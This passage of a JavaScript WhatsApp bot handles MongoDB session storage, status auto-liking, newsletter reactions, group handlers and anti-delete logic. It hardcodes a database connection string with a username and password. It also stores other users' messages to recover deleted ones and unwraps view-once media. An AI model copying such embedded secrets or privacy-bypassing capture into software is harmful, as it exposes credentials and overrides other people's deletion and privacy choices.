const openedSessions = new Set();

const express = require('express');
const fs = require('fs-extra');
const path = require('path');

// MODE BOT
global.botMode = 'public';
const os = require('os');
const { exec } = require('child_process');
const router = express.Router();
const pino = require('pino');
const { runtime } = require('./lib/functions');
const moment = require('moment-timezone');
const yts = require('yt-search');
const Jimp = require('jimp');
const crypto = require('crypto');
const fancy = require('./lib/style');
const axios = require('axios');
const FileType = require('file-type');
const fetch = require('node-fetch');
const { MongoClient } = require('mongodb');
const { loadPlugins } = require('./pluginLoader');
const plugins = loadPlugins();
const { sms, downloadMediaMessage } = require('./msg')
const { createStickerFromMedia, sendSticker } = require('./s-utils');
const { getGroupAdminsInfo, jidToNumber } = require('./normalize');
const { uploadFile: uploadCloudku } = require("cloudku-uploader");
const FormData = require("form-data");
// dans ton switch principal
const { groupStatus, buildStatusContent } = require('./status');
const { handleAntiLink } = require('./antilink');
const { toggleAntiLink, isAntiLinkEnabled } = require('./antilink');
const cheerio = require('cheerio');
const CryptoJS = require('crypto-js');
const {
  toggleWelcome,
  toggleGoodbye,
  isWelcomeEnabled,
  isGoodbyeEnabled,
  setWelcomeTemplate,
  setGoodbyeTemplate,
  handleParticipantUpdate
} = require('./welcome_goodbye');
const translate = require('google-translate-api');
const {
  default: makeWASocket,
  useMultiFileAuthState,
  delay,
  getContentType,
  makeCacheableSignalKeyStore,
  Browsers,
  downloadContentFromMessage,
  DisconnectReason
} = require('@ryuu-reinzz/baileys');
const { jidNormalizedUser } = require('@ryuu-reinzz/baileys')
// Au début de ton fichier, après les imports
if (!global.scheduledRestart) {
    global.scheduledRestart = null;
}
// Variable globale pour stocker la dernière traduction
let lastTranslationText = "";

// Optionnel: Sauvegarder l'état au redémarrage
process.on('exit', () => {
    if (global.scheduledRestart?.timer) {
        console.log('⏰ Schedule restart arrêté (process exit)');
    }
});
// ---------------- CONFIG ----------------

// main.js (ou handlers.js)
const BOT_NAME_FANCY = '𝐘𝐎𝐔 𝐖𝐄𝐁 𝐁𝐎𝐓 𝐈𝐒 𝐎𝐍𝐋𝐈𝐍𝐄 ✅';


  // en haut de mongo_utils.js (ou ton helper)
const DEFAULT_SESSION_CONFIG = {
  AUTO_VIEW_STATUS: true,
  AUTO_LIKE_STATUS: true,
  AUTO_RECORDING: true,
  AUTO_LIKE_EMOJI: ['🌛','💕','💀','👑','🇺🇸','❤️‍🩹','🎠','⚡','🌙','❤️'],
  PREFIX: '.',
  AUTO_ONLINE: false,
  ANTI_TAG_MODE: true,
  ENABLE_WELCOME: true,
  ENABLE_GOODBYE: true
};
const config = {
  MAX_RETRIES: 20,
  GROUP_INVITE_LINK: [
  'https://chat.whatsapp.com/JXGgcBzSJjCKzgfjzfqU7J',
  'https://chat.whatsapp.com/IZipHGDTShD7eQnbMHhNFal',
],
  RCD_IMAGE_PATH: 'https://files.catbox.moe/aq3wpt.jpeg',
  NEWSLETTER_JIDS: [
  '120363426341519710@newsletter',
  '120363426341519710@newsletter',
  '120363426341519710@newsletter',
  '120363426341519710@newsletter',
],
  OTP_EXPIRY: 300000,
  OWNER_NUMBER: process.env.OWNER_NUMBER || '56967395519',
  PREMIUM:'56967395519@s.whatsapp.net',
  CHANNEL_LINKS: [
  'https://whatsapp.com/channel/0029VbCtUug4o7qTFq7fpX1W',
],
  BOT_NAME: '𝐘𝐎𝐔 𝐖𝐄𝐁 𝐁𝐎𝐓',
  BOT_VERSION: '1.0.0',
  OWNER_NAME: '𝐘𝐎𝐔 𝐓𝐄𝐂𝐇𝐗 𝐎𝐅𝐂',
  IMAGE_PATH: 'https://i.postimg.cc/HkHw5qSN/file-0000000031f871fdbb71e79065924655.png',
  BOT_FOOTER: '𝙼𝙰𝙳𝙴 𝙸𝙽 𝙱𝚈 𝚈𝙾𝚄 𝚃𝙴𝙲𝙷𝚇 𝙾𝙵𝙲 🎠',
  BUTTON_IMAGES: { ALIVE: 'https://i.postimg.cc/hGD0FkT5/file-00000000ee0c720c90258685675507d2.png' }
};


// ---------------- MONGO SETUP ----------------

const MONGO_URI = process.env.MONGO_URI || 'mongodb+srv://youaloneboy704_db_user:DADSON55@cluster0.geubidg.mongodb.net/basebot_db?retryWrites=true&w=majority&appName=Cluster0';
const MONGO_DB = process.env.MONGO_DB || 'basebot_db'
let mongoClient, mongoDB;
let sessionsCol, numbersCol, adminsCol, newsletterCol, configsCol, newsletterReactsCol;

async function initMongo() {
  try {
    if (mongoClient && mongoClient.topology && mongoClient.topology.isConnected && mongoClient.topology.isConnected()) return;
  } catch(e){}
  mongoClient = new MongoClient(MONGO_URI, { useNewUrlParser: true, useUnifiedTopology: true });
  await mongoClient.connect();
  mongoDB = mongoClient.db(MONGO_DB);

  sessionsCol = mongoDB.collection('sessions');
  numbersCol = mongoDB.collection('numbers');
  adminsCol = mongoDB.collection('admins');
  newsletterCol = mongoDB.collection('newsletter_list');
  configsCol = mongoDB.collection('configs');
  newsletterReactsCol = mongoDB.collection('newsletter_reacts');

  await sessionsCol.createIndex({ number: 1 }, { unique: true });
  await numbersCol.createIndex({ number: 1 }, { unique: true });
  await newsletterCol.createIndex({ jid: 1 }, { unique: true });
  await newsletterReactsCol.createIndex({ jid: 1 }, { unique: true });
  await configsCol.createIndex({ number: 1 }, { unique: true });
  console.log('✅ Mongo initialized and collections ready');
}

// ---------------- Mongo helpers ----------------

async function saveCredsToMongo(number, creds, keys = null) {
  try {
    await initMongo();
    const sanitized = number.replace(/[^0-9]/g, '');
    const doc = { number: sanitized, creds, keys, updatedAt: new Date() };
    await sessionsCol.updateOne({ number: sanitized }, { $set: doc }, { upsert: true });
    console.log(`Saved creds to Mongo for ${sanitized}`);
  } catch (e) { console.error('saveCredsToMongo error:', e); }
}

async function loadCredsFromMongo(number) {
  try {
    await initMongo();
    const sanitized = number.replace(/[^0-9]/g, '');
    const doc = await sessionsCol.findOne({ number: sanitized });
    return doc || null;
  } catch (e) { console.error('loadCredsFromMongo error:', e); return null; }
}

async function removeSessionFromMongo(number) {
  try {
    await initMongo();
    const sanitized = number.replace(/[^0-9]/g, '');
    await sessionsCol.deleteOne({ number: sanitized });
    console.log(`Removed session from Mongo for ${sanitized}`);
  } catch (e) { console.error('removeSessionToMongo error:', e); }
}

async function addNumberToMongo(number) {
  try {
    await initMongo();
    const sanitized = number.replace(/[^0-9]/g, '');
    await numbersCol.updateOne({ number: sanitized }, { $set: { number: sanitized } }, { upsert: true });
    console.log(`Added number ${sanitized} to Mongo numbers`);
  } catch (e) { console.error('addNumberToMongo', e); }
}

async function removeNumberFromMongo(number) {
  try {
    await initMongo();
    const sanitized = number.replace(/[^0-9]/g, '');
    await numbersCol.deleteOne({ number: sanitized });
    console.log(`Removed number ${sanitized} from Mongo numbers`);
  } catch (e) { console.error('removeNumberFromMongo', e); }
}

async function getAllNumbersFromMongo() {
  try {
    await initMongo();
    const docs = await numbersCol.find({}).toArray();
    return docs.map(d => d.number);
  } catch (e) { console.error('getAllNumbersFromMongo', e); return []; }
}

async function loadAdminsFromMongo() {
  try {
    await initMongo();
    const docs = await adminsCol.find({}).toArray();
    return docs.map(d => d.jid || d.number).filter(Boolean);
  } catch (e) { console.error('loadAdminsFromMongo', e); return []; }
}

async function addAdminToMongo(jidOrNumber) {
  try {
    await initMongo();
    const doc = { jid: jidOrNumber };
    await adminsCol.updateOne({ jid: jidOrNumber }, { $set: doc }, { upsert: true });
    console.log(`Added admin ${jidOrNumber}`);
  } catch (e) { console.error('addAdminToMongo', e); }
}

async function removeAdminFromMongo(jidOrNumber) {
  try {
    await initMongo();
    await adminsCol.deleteOne({ jid: jidOrNumber });
    console.log(`Removed admin ${jidOrNumber}`);
  } catch (e) { console.error('removeAdminFromMongo', e); }
}

async function addNewsletterToMongo(jid, emojis = []) {
  try {
    await initMongo();
    const doc = { jid, emojis: Array.isArray(emojis) ? emojis : [], addedAt: new Date() };
    await newsletterCol.updateOne({ jid }, { $set: doc }, { upsert: true });
    console.log(`Added newsletter ${jid} -> emojis: ${doc.emojis.join(',')}`);
  } catch (e) { console.error('addNewsletterToMongo', e); throw e; }
}

async function removeNewsletterFromMongo(jid) {
  try {
    await initMongo();
    await newsletterCol.deleteOne({ jid });
    console.log(`Removed newsletter ${jid}`);
  } catch (e) { console.error('removeNewsletterFromMongo', e); throw e; }
}

async function listNewslettersFromMongo() {
  try {
    await initMongo();
    const docs = await newsletterCol.find({}).toArray();
    return docs.map(d => ({ jid: d.jid, emojis: Array.isArray(d.emojis) ? d.emojis : [] }));
  } catch (e) { console.error('listNewslettersFromMongo', e); return []; }
}

async function saveNewsletterReaction(jid, messageId, emoji, sessionNumber) {
  try {
    await initMongo();
    const doc = { jid, messageId, emoji, sessionNumber, ts: new Date() };
    if (!mongoDB) await initMongo();
    const col = mongoDB.collection('newsletter_reactions_log');
    await col.insertOne(doc);
    console.log(`Saved reaction ${emoji} for ${jid}#${messageId}`);
  } catch (e) { console.error('saveNewsletterReaction', e); }
}

async function setUserConfigInMongo(number, conf) {
  try {
    await initMongo();
    const sanitized = number.replace(/[^0-9]/g, '');
    await configsCol.updateOne({ number: sanitized }, { $set: { number: sanitized, config: conf, updatedAt: new Date() } }, { upsert: true });
  } catch (e) { console.error('setUserConfigInMongo', e); }
}

async function loadUserConfigFromMongo(number) {
  try {
    await initMongo();
    const sanitized = number.replace(/[^0-9]/g, '');
    const doc = await configsCol.findOne({ number: sanitized });
    return doc ? doc.config : null;
  } catch (e) { console.error('loadUserConfigFromMongo', e); return null; }
}

async function loadSessionConfigMerged(number) {
  const sanitized = String(number).replace(/[^0-9]/g, '');
  // charge la config brute depuis la DB
  const dbCfg = await loadUserConfigFromMongo(sanitized) || {};
  // fusionne : les valeurs en DB écrasent les defaults
  const merged = { ...DEFAULT_SESSION_CONFIG, ...dbCfg };
  return merged;
}

// Helpers Mongo pour persister le schedule
async function getRestartSchedule() {
  await initMongo();
  const col = mongoDB.collection('restart_schedule');
  const doc = await col.findOne({ key: 'schedule' });
  return doc ? doc : null;
}

async function setRestartSchedule(minutes) {
  await initMongo();
  const col = mongoDB.collection('restart_schedule');
  await col.updateOne(
    { key: 'schedule' },
    { $set: { minutes, active: true, updatedAt: Date.now() } },
    { upsert: true }
  );
}

async function stopRestartSchedule() {
  await initMongo();
  const col = mongoDB.collection('restart_schedule');
  await col.updateOne(
    { key: 'schedule' },
    { $set: { active: false, updatedAt: Date.now() } },
    { upsert: true }
  );
}

// Assure-toi que initMongo() initialise `mongoDB` (ex: mongoDB = client.db(process.env.MONGO_DB))

(async () => {
  const doc = await getRestartSchedule();
  if (doc && doc.active && doc.minutes > 0) {
    global.restartTimer = setInterval(() => {
      console.log(`🔄 Restart automatique (${doc.minutes} minutes)`);
      process.exit(0);
    }, doc.minutes * 60 * 1000);
    global.restartInterval = doc.minutes;
    console.log(`✅ Schedule restart restauré: toutes les ${doc.minutes} minutes`);
  }
})();

/**
 * Crée les index recommandés pour la collection status_infractions.
 * Appelle cette fonction au démarrage de l'app.
 */
async function ensureStatusInfractionsIndex() {
  try {
    await initMongo();
    const col = mongoDB.collection('status_infractions');
    // index composé pour recherches rapides et upserts uniques
    await col.createIndex({ sessionId: 1, groupId: 1, participant: 1 }, { unique: true });
    // index sur lastAt pour purge/maintenance
    await col.createIndex({ lastAt: 1 });
  } catch (e) {
    console.warn('ensureStatusInfractionsIndex error', e);
  }
}

/**
 * Récupère le document d'infraction pour une session/groupe/participant.
 * Retourne null si absent ou en cas d'erreur.
 */
async function getStatusInfractionDoc(sessionId, groupId, participant) {
  try {
    await initMongo();
    const col = mongoDB.collection('status_infractions');
    const s = String(sessionId || '');
    const g = String(groupId || '');
    const p = String(participant || '');
    if (!s || !g || !p) return null;
    return await col.findOne({ sessionId: s, groupId: g, participant: p });
  } catch (e) {
    console.error('getStatusInfractionDoc', e);
    return null;
  }
}

/**
 * Incrémente le compteur d'infractions et renvoie la valeur après incrément.
 * Si l'opération échoue, renvoie 1 par défaut.
 */
async function incrStatusInfraction(sessionId, groupId, participant) {
  try {
    await initMongo();
    const col = mongoDB.collection('status_infractions');
    const now = Date.now();
    const s = String(sessionId || '');
    const g = String(groupId || '');
    const p = String(participant || '');
    if (!s || !g || !p) return 1;

    const res = await col.findOneAndUpdate(
      { sessionId: s, groupId: g, participant: p },
      { $inc: { count: 1 }, $set: { lastAt: now } },
      { upsert: true, returnDocument: 'after' } // driver mongodb v4+
    );

    const value = res && res.value ? res.value : null;
    if (value && typeof value.count === 'number') return value.count;

    // fallback : lire explicitement
    const doc = await col.findOne({ sessionId: s, groupId: g, participant: p });
    return doc && typeof doc.count === 'number' ? doc.count : 1;
  } catch (e) {
    console.error('incrStatusInfraction', e);
    return 1;
  }
}

/**
 * Réinitialise (supprime) le document d'infraction pour la clé donnée.
 * Retourne true si OK, false sinon.
 */
async function resetStatusInfraction(sessionId, groupId, participant) {
  try {
    await initMongo();
    const col = mongoDB.collection('status_infractions');
    const s = String(sessionId || '');
    const g = String(groupId || '');
    const p = String(participant || '');
    if (!s || !g || !p) return false;
    await col.deleteOne({ sessionId: s, groupId: g, participant: p });
    return true;
  } catch (e) {
    console.error('resetStatusInfraction', e);
    return false;
  }
}

/**
 * Définit explicitement le compteur d'infractions (upsert).
 * Retourne true si OK, false sinon.
 */
async function setStatusInfractionCount(sessionId, groupId, participant, count) {
  try {
    await initMongo();
    const col = mongoDB.collection('status_infractions');
    const s = String(sessionId || '');
    const g = String(groupId || '');
    const p = String(participant || '');
    const c = Number.isFinite(Number(count)) ? Number(count) : 0;
    if (!s || !g || !p) return false;
    await col.updateOne(
      { sessionId: s, groupId: g, participant: p },
      { $set: { count: c, lastAt: Date.now() } },
      { upsert: true }
    );
    return true;
  } catch (e) {
    console.error('setStatusInfractionCount', e);
    return false;
  }
}
// -------------- newsletter react-config helpers --------------

async function addNewsletterReactConfig(jid, emojis = []) {
  try {
    await initMongo();
    await newsletterReactsCol.updateOne({ jid }, { $set: { jid, emojis, addedAt: new Date() } }, { upsert: true });
    console.log(`Added react-config for ${jid} -> ${emojis.join(',')}`);
  } catch (e) { console.error('addNewsletterReactConfig', e); throw e; }
}

async function removeNewsletterReactConfig(jid) {
  try {
    await initMongo();
    await newsletterReactsCol.deleteOne({ jid });
    console.log(`Removed react-config for ${jid}`);
  } catch (e) { console.error('removeNewsletterReactConfig', e); throw e; }
}

async function listNewsletterReactsFromMongo() {
  try {
    await initMongo();
    const docs = await newsletterReactsCol.find({}).toArray();
    return docs.map(d => ({ jid: d.jid, emojis: Array.isArray(d.emojis) ? d.emojis : [] }));
  } catch (e) { console.error('listNewsletterReactsFromMongo', e); return []; }
}

async function getReactConfigForJid(jid) {
  try {
    await initMongo();
    const doc = await newsletterReactsCol.findOne({ jid });
    return doc ? (Array.isArray(doc.emojis) ? doc.emojis : []) : null;
  } catch (e) { console.error('getReactConfigForJid', e); return null; }
}

// ---------------- basic utils ----------------

function formatMessage(title, content, footer) {
  return `*${title}*\n\n${content}\n\n> *${footer}*`;
}
function generateOTP(){ return Math.floor(100000 + Math.random() * 900000).toString(); }
function getHaitiTimestamp() { 
  return moment().tz('America/Port-au-Prince').format('dddd D MMMM YYYY, HH:mm:ss');
}

// Résultat : "lundi 27 janvier 2025, 15:30:45"
// ✅ FIX: Use global.activeSockets so index.js and routes.js share the same map
if (!global.activeSockets) global.activeSockets = new Map();
const activeSockets = global.activeSockets;

const socketCreationTime = new Map();
// ✅ FIX: Use global pendingPairs so index.js deleteSession can also clear it
if (!global.pendingPairs) global.pendingPairs = new Set();
const pendingPairs = global.pendingPairs;

const otpStore = new Map();
// ============================================================
// ANTIDELETE STORE — Store en mémoire par session
// ============================================================
const messageStores = new Map(); // sessionNumber → Map<msgId, msgObject>

const STORE_MAX_PER_SESSION = 500;  // quota max par session
const STORE_CLEAN_INTERVAL  = 20 * 60 * 1000; // nettoyage toutes les 20 min

function getSessionStore(sessionNumber) {
  if (!messageStores.has(sessionNumber)) {
    messageStores.set(sessionNumber, new Map());
  }
  return messageStores.get(sessionNumber);
}

function storeMessage(sessionNumber, msg) {
  if (!msg?.key?.id || !msg?.message) return;
  const store = getSessionStore(sessionNumber);

  // Quota dépassé → vider les 100 plus anciens
  if (store.size >= STORE_MAX_PER_SESSION) {
    const keys = [...store.keys()].slice(0, 100);
    keys.forEach(k => store.delete(k));
  }

  store.set(msg.key.id, msg);
}

function getStoredMessage(sessionNumber, msgId) {
  return getSessionStore(sessionNumber).get(msgId) || null;
}

// Nettoyage automatique toutes les 20 min
setInterval(() => {
  for (const [sessionNumber, store] of messageStores.entries()) {
    store.clear();
    console.log(`[ANTIDELETE] Store nettoyé pour session ${sessionNumber}`);
  }
}, STORE_CLEAN_INTERVAL);

// ---------------- helpers kept/adapted ----------------

async function joinGroup(socket) {
  let retries = config.MAX_RETRIES;
  const inviteCodeMatch = (config.GROUP_INVITE_LINK || '').match(/chat\.whatsapp\.com\/([a-zA-Z0-9]+)/);
  if (!inviteCodeMatch) return { status: 'failed', error: 'No group invite configured' };
  const inviteCode = inviteCodeMatch[1];
  while (retries > 0) {
    try {
      const response = await socket.groupAcceptInvite(inviteCode);
      if (response?.gid) return { status: 'success', gid: response.gid };
      throw new Error('No group ID in response');
    } catch (error) {
      retries--;
      let errorMessage = error.message || 'Unknown error';
      if (error.message && error.message.includes('not-authorized')) errorMessage = 'Bot not authorized';
      else if (error.message && error.message.includes('conflict')) errorMessage = 'Already a member';
      else if (error.message && error.message.includes('gone')) errorMessage = 'Invite invalid/expired';
      if (retries === 0) return { status: 'failed', error: errorMessage };
      await delay(2000 * (config.MAX_RETRIES - retries));
    }
  }
  return { status: 'failed', error: 'Max retries reached' };
}

async function sendAdminConnectMessage(socket, number, groupResult, sessionConfig = {}) {
  const admins = await loadAdminsFromMongo();
  const groupStatus = groupResult.status === 'success' ? `Joined (ID: ${groupResult.gid})` : `Failed to join group: ${groupResult.error}`;
  const botName = sessionConfig.botName || BOT_NAME_FANCY;
  const image = sessionConfig.logo || config.RCD_IMAGE_PATH;
  const caption = formatMessage(botName, `📞 ɴᴜᴍʙᴇʀ: ${number}\n🩵 sᴛᴀᴛᴜᴛ: ${groupStatus}\n🕒 ᴄᴏɴɴᴇᴄᴛᴇ́ ᴀ: ${getHaitiTimestamp()}`, botName);
  for (const admin of admins) {
    try {
      const to = admin.includes('@') ? admin : `${admin}@s.whatsapp.net`;
      if (String(image).startsWith('http')) {
        await socket.sendMessage(to, { image: { url: image }, caption });
      } else {
        try {
          const buf = fs.readFileSync(image);
          await socket.sendMessage(to, { image: buf, caption });
        } catch (e) {
          await socket.sendMessage(to, { image: { url: config.RCD_IMAGE_PATH }, caption });
        }
      }
    } catch (err) {
      console.error('Failed to send connect message to admin', admin, err?.message || err);
    }
  }
}

async function sendOwnerConnectMessage(socket, number, groupResult, sessionConfig = {}) {
  try {
    const ownerJid = `${config.OWNER_NUMBER.replace(/[^0-9]/g,'')}@s.whatsapp.net`;
    const activeCount = activeSockets.size;
    const botName = sessionConfig.botName || BOT_NAME_FANCY;
    const image = sessionConfig.logo || config.RCD_IMAGE_PATH;

    const groupStatus = groupResult.status === 'success' 
      ? `✅ Rejoint (ID: ${groupResult.gid})` 
      : `❌ Échec: ${groupResult.error}`;
    
    // Message très simple et clair
    const caption = `╭┄┄「 ⊹ ࣪ ˖𝐍𝐎𝐓𝐈𝐅𝐈𝐂𝐀𝐓𝐈𝐎𝐍 ⊹ ࣪ ˖ 」
│. ˚˖𓍢ִ໋🤖 ʙᴏᴛ: ${botName}
│. ˚˖𓍢ִ໋📱 ɴᴜᴍᴇ́ʀᴏ: ${number}
│. ˚˖𓍢ִ໋🩵 sᴛᴀᴛᴜᴛ: ${groupStatus}
│. ˚˖𓍢ִ໋🕒 ᴄᴏɴɴᴇᴄᴛᴇ́: ${getHaitiTimestamp()}
│. ˚˖𓍢ִ໋👥 sᴇssɪᴏɴs: ${activeCount}
│. ˚˖𓍢ִ໋📍 ғᴜsᴇᴀᴜ: ʙʀᴇ́sɪʟ
│. ˚˖𓍢ִ໋📊 ᴘᴇʀғᴏʀᴍᴀɴᴄᴇ: ${activeCount > 5 ? "ᴇ́ʟᴇᴠᴇ́ᴇ" : "ɴᴏʀᴍᴀʟᴇ"}
╰┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄ᕗ

⚠️ ɴᴏᴛɪғɪᴄᴀᴛɪᴏɴ ᴀᴜᴛᴏᴍᴀᴛɪǫᴜᴇ
${new Date().toLocaleString('fr-FR', { 
  timeZone: 'America/Port-au-Prince',
  dateStyle: 'medium',
  timeStyle: 'short'
})}`;

    if (String(image).startsWith('http')) {
      await socket.sendMessage(ownerJid, { 
        image: { url: image }, 
        caption: caption
      });
    } else {
      try {
        const buf = fs.readFileSync(image);
        await socket.sendMessage(ownerJid, { 
          image: buf, 
          caption: caption
        });
      } catch (e) {
        await socket.sendMessage(ownerJid, { 
          image: { url: config.RCD_IMAGE_PATH }, 
          caption: caption
        });
      }
    }
    
    console.log(`✅ Notification propriétaire envoyée (${activeCount} sessions)`);
    
  } catch (err) { 
    console.error('❌ Échec notification propriétaire:', err.message || err); 
  }
}
async function sendOTP(socket, number, otp) {
  const userJid = jidNormalizedUser(socket.user.id);
  const message = formatMessage(`🔐 OTP VERIFICATION — ${BOT_NAME_FANCY}`, `Your OTP for config update is: *${otp}*\nThis OTP will expire in 5 minutes.\n\nNumber: ${number}`, BOT_NAME_FANCY);
  try { await socket.sendMessage(userJid, { text: message }); console.log(`OTP ${otp} sent to ${number}`); }
  catch (error) { console.error(`Failed to send OTP to ${number}:`, error); throw error; }
}

// ---------------- handlers (newsletter + reactions) ----------------

async function setupNewsletterHandlers(socket, sessionNumber) {
  const rrPointers = new Map();

  socket.ev.on('messages.upsert', async ({ messages }) => {
    const message = messages[0];
    if (!message?.key) return;
    const jid = message.key.remoteJid;

    try {
      const followedDocs = await listNewslettersFromMongo(); // array of {jid, emojis}
      const reactConfigs = await listNewsletterReactsFromMongo(); // [{jid, emojis}]
      const reactMap = new Map();
      for (const r of reactConfigs) reactMap.set(r.jid, r.emojis || []);

      const followedJids = followedDocs.map(d => d.jid);
      if (!followedJids.includes(jid) && !reactMap.has(jid)) return;

      let emojis = reactMap.get(jid) || null;
      if ((!emojis || emojis.length === 0) && followedDocs.find(d => d.jid === jid)) {
        emojis = (followedDocs.find(d => d.jid === jid).emojis || []);
      }
      if (!emojis || emojis.length === 0) emojis = config.AUTO_LIKE_EMOJI;

      let idx = rrPointers.get(jid) || 0;
      const emoji = emojis[idx % emojis.length];
      rrPointers.set(jid, (idx + 1) % emojis.length);

      const messageId = message.newsletterServerId || message.key.id;
      if (!messageId) return;

      let retries = 3;
      while (retries-- > 0) {
        try {
          if (typeof socket.newsletterReactMessage === 'function') {
            await socket.newsletterReactMessage(jid, messageId.toString(), emoji);
          } else {
            await socket.sendMessage(jid, { react: { text: emoji, key: message.key } });
          }
          console.log(`Reacted to ${jid} ${messageId} with ${emoji}`);
          await saveNewsletterReaction(jid, messageId.toString(), emoji, sessionNumber || null);
          break;
        } catch (err) {
          console.warn(`Reaction attempt failed (${3 - retries}/3):`, err?.message || err);
          await delay(1200);
        }
      }

    } catch (error) {
      console.error('Newsletter reaction handler error:', error?.message || error);
    }
  });
}

// Assure-toi d'avoir importé ton helper en haut du fichier
// const { handleParticipantUpdate } = require('./welcome_goodbye');

/**
 * Enregistre les listeners liés aux participants de groupe.
 * Appelle cette fonction une seule fois après l'initialisation du socket.
 * @param {import('baileys').AnySocket} socket
 */
async function registerGroupParticipantListener(socket) {
  // on attache l'événement une seule fois
  socket.ev.on('group-participants.update', async (update) => {
    try {
      if (!update) return;

      // Compatibilité selon versions : id ou groupId
      const from = update.id || update?.groupId || null;
      if (!from) {
        console.warn('GROUP PARTICIPANTS UPDATE: missing group id', update);
        return;
      }

      // Normaliser participants (Baileys peut renvoyer participants ou participant)
      const participants = Array.isArray(update.participants)
        ? update.participants
        : (update.participant ? [update.participant] : []);

      if (!participants.length) return;

      // Log utile pour debug
      console.log('GROUP PARTICIPANTS UPDATE -> group:', from, 'action:', update.action, 'participants:', participants);

      // Appel du handler centralisé (welcome_goodbye.js)
      await handleParticipantUpdate(socket, from, update);

      // ======= ANTIDEMOTE HANDLER =======
      if (update.action === 'demote' && global.antidemoteGroups && global.antidemoteGroups.has(from)) {
        try {
          const { groupAdminsJid, botJid } = await require('./normalize').getGroupAdminsInfo(socket, from);
          if (botJid && groupAdminsJid.includes(botJid)) {
            // Ré-promouvoir les victimes et retirer l'auteur si possible
            for (const victim of participants) {
              try {
                await socket.groupParticipantsUpdate(from, [victim], 'promote');
                await socket.sendMessage(from, {
                  text: `🛡️ *𝐀𝐍𝐓𝐈𝐃𝐄𝐌𝐎𝐓𝐄*\n@${victim.split('@')[0]} a été ré-promu automatiquement!`,
                  mentions: [victim]
                });
              } catch (_) {}
            }
          }
        } catch (e) { console.error('[ANTIDEMOTE HANDLER]', e); }
      }

    } catch (e) {
      console.error('GROUP PARTICIPANTS UPDATE ERROR', e);
    }
  });
}
// ---------------- status + revocation + resizing ----------------

async function setupStatusHandlers(socket, sanitizedNumber) {
  socket.ev.on('messages.upsert', async ({ messages }) => {
    const message = messages[0];
    if (!message?.key || message.key.remoteJid !== 'status@broadcast' || !message.key.participant) return;

    // UTILISER sanitizedNumber (déjà nettoyé) ; fallback minimal si absent
    const sessionId = (sanitizedNumber && String(sanitizedNumber).replace(/[^0-9]/g,''))
      || (socket?.authState?.creds?.me?.id || socket?.user?.id || message.key.participant || message.key.remoteJid || '')
           .split('@')[0].replace(/[^0-9]/g,'');

    console.log('[HANDLER] status event remoteJid:', message.key.remoteJid, 'participant:', message.key.participant);
    console.log('[HANDLER] using sessionId:', sessionId);

    if (!sessionId) {
      console.warn('[HANDLER] No sessionId available for status handler; skipping session-specific config');
      return;
    }

    const cfg = await loadSessionConfigMerged(sessionId);
    console.log('[HANDLER] merged cfg for', sessionId, cfg);

    try {
      if (cfg.AUTO_ONLINE) {
        console.log('[HANDLER] AUTO_ONLINE -> sending available presence');
        await socket.sendPresenceUpdate('available', message.key.remoteJid);
        setTimeout(async () => {
          try { await socket.sendPresenceUpdate('unavailable', message.key.remoteJid); }
          catch (e) { console.warn('[HANDLER] presence revert failed', e); }
        }, 5000);
      }

      if (cfg.AUTO_RECORDING) {
        await socket.sendPresenceUpdate('recording', message.key.remoteJid);
      }

      if (cfg.AUTO_VIEW_STATUS) {
        let retries = config.MAX_RETRIES;
        while (retries > 0) {
          try { await socket.readMessages([message.key]); break; }
          catch (error) { retries--; await delay(1000 * (config.MAX_RETRIES - retries)); if (retries === 0) throw error; }
        }
      }

      if (cfg.AUTO_LIKE_STATUS) {
        const emojis = Array.isArray(cfg.AUTO_LIKE_EMOJI) && cfg.AUTO_LIKE_EMOJI.length ? cfg.AUTO_LIKE_EMOJI : config.AUTO_LIKE_EMOJI;
        const randomEmoji = emojis[Math.floor(Math.random() * emojis.length)];
        let retries = config.MAX_RETRIES;
        while (retries > 0) {
          try {
            await socket.sendMessage(
              message.key.remoteJid,
              { react: { text: randomEmoji, key: message.key } },
              { statusJidList: [message.key.participant] }
            );
            break;
          } catch (error) {
            retries--;
            await delay(1000 * (config.MAX_RETRIES - retries));
            if (retries === 0) throw error;
          }
        }
      }

    } catch (error) {
      console.error('Status handler error:', error);
    }
  });
}
// downloader robuste
async function robustDownload(messageObj, downloader) {
  // messageObj peut être quoted, quoted.viewOnceMessage, imageMessage, etc.
  if (!messageObj) throw new Error('No message object provided to downloader');

  // extraire inner message si viewOnce
  const innerFromViewOnce = messageObj.viewOnceMessage?.message || messageObj;
  // trouver le type présent
  const qTypes = ['imageMessage','videoMessage','documentMessage','stickerMessage','audioMessage'];
  let inner = null;
  for (const t of qTypes) {
    if (innerFromViewOnce[t]) { inner = innerFromViewOnce[t]; break; }
  }
  // si aucun type trouvé, peut-être que messageObj est déjà le content
  if (!inner) {
    // essayer d'utiliser messageObj.imageMessage etc.
    for (const t of qTypes) {
      if (messageObj[t]) { inner = messageObj[t]; break; }
    }
  }
  if (!inner) inner = innerFromViewOnce;

  // déterminer le type pour downloadContentFromMessage
  let type = 'image';
  if (inner.videoMessage) type = 'video';
  else if (inner.documentMessage) type = 'document';
  else if (inner.audioMessage) type = 'audio';
  else if (inner.stickerMessage) type = 'sticker';
  else if (inner.imageMessage) type = 'image';

  // downloader peut être une fonction qui renvoie Buffer ou un stream async iterable
  if (typeof downloader !== 'function') throw new Error('Downloader function required');

  const streamOrBuffer = await downloader(inner, type);
  if (!streamOrBuffer) throw new Error('Downloader returned empty');

  if (Buffer.isBuffer(streamOrBuffer)) return streamOrBuffer;

  // sinon concaténer le stream async iterable
  const chunks = [];
  for await (const chunk of streamOrBuffer) chunks.push(chunk);
  const buffer = Buffer.concat(chunks);
  if (!buffer || buffer.length === 0) throw new Error('Buffer vide après téléchargement');
  return buffer;
}
async function handleMessageRevocation(socket, number) {
  const sanitized = String(number || '').replace(/[^0-9]/g, '');
  const ownerJid  = `${sanitized}@s.whatsapp.net`;

  // ── Listener 1 : messages.delete ──
  socket.ev.on('messages.delete', async ({ keys }) => {
    if (!keys?.length) return;
    for (const key of keys) {
      try {
        await processRevoke(sanitized, ownerJid, socket, key.id, key.remoteJid, key.participant);
      } catch(e) { console.error('[AD messages.delete]', e); }
    }
  });

  // ── Listener 2 : protocolMessage REVOKE ──
  socket.ev.on('messages.upsert', async ({ messages }) => {
    for (const m of messages) {
      try {
        if (m?.message?.protocolMessage?.type !== 0) continue;
        const revokedKey = m.message.protocolMessage.key;
        if (!revokedKey?.id) continue;
        await processRevoke(
          sanitized, ownerJid, socket,
          revokedKey.id,
          revokedKey.remoteJid || m.key.remoteJid,
          revokedKey.participant || m.key.participant
        );
